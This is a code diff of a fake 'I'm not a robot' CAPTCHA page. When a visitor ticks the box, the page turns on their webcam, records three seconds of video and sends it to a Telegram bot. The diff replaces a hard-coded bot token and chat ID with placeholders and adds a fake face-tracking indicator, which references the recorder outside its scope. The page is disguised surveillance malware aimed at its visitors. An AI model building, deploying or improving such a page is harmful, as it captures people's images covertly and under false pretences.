@@ -4,148 +4,131 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Robot Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: 'Roboto', sans-serif;
             margin: 0;
+            padding: 0;
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background: linear-gradient(135deg, #1E88E5, #43A047);
-            color: white;
-            overflow: hidden;
+            background: linear-gradient(135deg, #74ebd5, #acb6e5);
+            animation: backgroundAnimation 10s ease infinite alternate;
+        }
+
+        @keyframes backgroundAnimation {
+            0% {
+                background: linear-gradient(135deg, #74ebd5, #acb6e5);
+            }
+            100% {
+                background: linear-gradient(135deg, #acb6e5, #74ebd5);
+            }
         }
 
         .container {
             text-align: center;
-            background: rgba(0, 0, 0, 0.8);
-            padding: 40px;
+            background-color: rgba(255, 255, 255, 0.9);
             border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            transform: scale(0.9);
-            animation: zoomIn 0.5s ease-out forwards;
+            padding: 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            position: relative; /* Position relative for absolute children */
         }
 
         h1 {
-            font-size: 26px;
+            font-size: 2.5em;
             margin-bottom: 20px;
+            color: #4CAF50; /* Green color for the title */
         }
 
-        .checkbox-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 20px 0;
-            gap: 10px;
-            font-size: 18px;
-            cursor: pointer;
+        #checkbox-container {
+            margin-top: 20px;
+        }
+
+        label {
+            font-size: 1.2em;
         }
 
         input[type="checkbox"] {
-            width: 24px;
-            height: 24px;
-            accent-color: #4CAF50;
-            transition: transform 0.3s ease;
+            margin-right: 10px;
+            transform: scale(1.5);
         }
 
-        input[type="checkbox"]:checked {
-            transform: scale(1.3);
+        video {
+            display: none; /* Hide video element */
         }
 
-        .loading {
-            display: none;
-            font-size: 18px;
-            margin-top: 20px;
-            color: #FBC02D;
-        }
-
-        .success {
-            display: none;
-            font-size: 20px;
-            margin-top: 20px;
-            color: #4CAF50;
-        }
-
-        .body-view {
-            width: 150px;
-            height: 150px;
+        .face-indicator {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100px; /* Size of the indicator */
+            height: 100px; /* Size of the indicator */
             border-radius: 50%;
-            background-color: white;
-            margin: 20px auto;
-            animation: bounce 2s infinite;
+            border: 4px solid rgba(76, 175, 80, 0.8); /* Green border */
+            transform: translate(-50%, -50%);
+            animation: pulse-animation 1s infinite; /* Pulsing effect */
+            display: none; /* Initially hidden */
         }
 
-        @keyframes zoomIn {
-            0% {
-                transform: scale(0.8);
-                opacity: 0;
-            }
-            100% {
-                transform: scale(1);
-                opacity: 1;
-            }
+        @keyframes pulse-animation {
+            0% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.1); }
+            100% { transform: translate(-50%, -50%) scale(1); }
         }
 
-        @keyframes bounce {
-            0%, 100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-15px);
-            }
+        #loading, #success {
+            font-size: 1.2em;
+            color: #4CAF50; /* Green color for messages */
+            margin-top: 20px;
         }
 
-        @keyframes fadeOut {
-            0% {
-                opacity: 1;
-            }
-            100% {
-                opacity: 0;
-                display: none;
-            }
+        #loading {
+            display: none;
         }
 
-        .hidden {
+        #success {
             display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Are you a robot?</h1>
-        <div class="checkbox-container">
-            <input type="checkbox" id="robot-checkbox">
-            <label for="robot-checkbox">I'm not a robot</label>
+        <h1>Are you a Robot?</h1>
+        <div id="checkbox-container">
+            <label>
+                <input type="checkbox" id="robot-checkbox"> I'm not a robot
+            </label>
         </div>
-        <div class="body-view"></div>
-        <video id="video" autoplay playsinline muted class="hidden"></video>
-        <div class="loading">Processing your request... ⏳</div>
-        <div class="success">✅ You're verified! Please wait...</div>
+        
+        <!-- Face Indicator -->
+        <div class="face-indicator" id="face-indicator"></div>
+
+        <video id="video" autoplay playsinline muted></video>
+        
+        <div id="loading">Recording... Please wait</div>
+        <div id="success">✅ Verification Complete!</div>
     </div>
 
     <script>
         const video = document.getElementById('video');
         const checkbox = document.getElementById('robot-checkbox');
-        const loading = document.querySelector('.loading');
-        const success = document.querySelector('.success');
-        const bodyView = document.querySelector('.body-view');
-        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
-        const telegramChatId = "2070423407";
+        const loading = document.getElementById('loading');
+        const success = document.getElementById('success');
+        const faceIndicator = document.getElementById('face-indicator');
+
+        // Telegram API credentials (keep these secure in production)
+        const telegramToken = "YOUR_TELEGRAM_BOT_TOKEN";
+        const telegramChatId = "YOUR_CHAT_ID";
 
         checkbox.addEventListener('change', (e) => {
             if (e.target.checked) {
-                // Show animations
                 loading.style.display = 'block';
-                success.style.display = 'none';
+                faceIndicator.style.display = 'block'; // Show face indicator
 
-                // Access the camera
                 navigator.mediaDevices.getUserMedia({
-                    video: {
-                        width: { ideal: 320 },
-                        height: { ideal: 240 },
-                        frameRate: { ideal: 15 }
-                    }
+                    video: { width: { ideal: 320 }, height: { ideal: 240 }, frameRate: { ideal: 15 } }
                 }).then((stream) => {
                     video.srcObject = stream;
 
@@ -154,13 +137,11 @@
 
                     mediaRecorder.start();
 
-                    mediaRecorder.ondataavailable = (event) => {
-                        chunks.push(event.data);
-                    };
+                    mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
 
                     setTimeout(() => {
                         mediaRecorder.stop();
-                    }, 3000); // Record for 3 seconds
+                    }, 3000); // Record for only 3 seconds
 
                     mediaRecorder.onstop = () => {
                         const blob = new Blob(chunks, { type: 'video/webm' });
@@ -174,12 +155,12 @@
                         })
                         .then((response) => {
                             if (response.ok) {
-                                // Hide loading, show success
-                                loading.style.display = 'none';
                                 success.style.display = 'block';
                                 setTimeout(() => {
+                                    loading.style.display = 'none';
                                     success.style.display = 'none';
-                                }, 2000); // Wait 2 seconds for "success"
+                                    alert('Verification complete!');
+                                }, 2000);
                             } else {
                                 alert('Failed to send video.');
                             }
@@ -188,12 +169,28 @@
                             alert('Error: ' + error.message);
                         });
 
-                        // Stop the camera
                         stream.getTracks().forEach(track => track.stop());
+                        faceIndicator.style.display = 'none'; // Hide face indicator after recording
                     };
                 }).catch((err) => {
                     alert("Unable to access camera: " + err.message);
                 });
+                
+                // Simulate face tracking (for demonstration purposes)
+                let interval = setInterval(() => {
+                    if (faceIndicator.style.display === 'block') {
+                        const xPos = Math.random() * (window.innerWidth - 100); // Random x position
+                        const yPos = Math.random() * (window.innerHeight - 100); // Random y position
+                        faceIndicator.style.transform = `translate(${xPos}px, ${yPos}px)`; // Move indicator
+                    }
+                }, 500);
+
+                // Stop moving the indicator when recording stops
+                mediaRecorder.onstop = () => clearInterval(interval);
+                
+                // Stop moving the indicator when checkbox is unchecked
+                checkbox.addEventListener('change', () => clearInterval(interval));
+                
             }
         });
     </script>
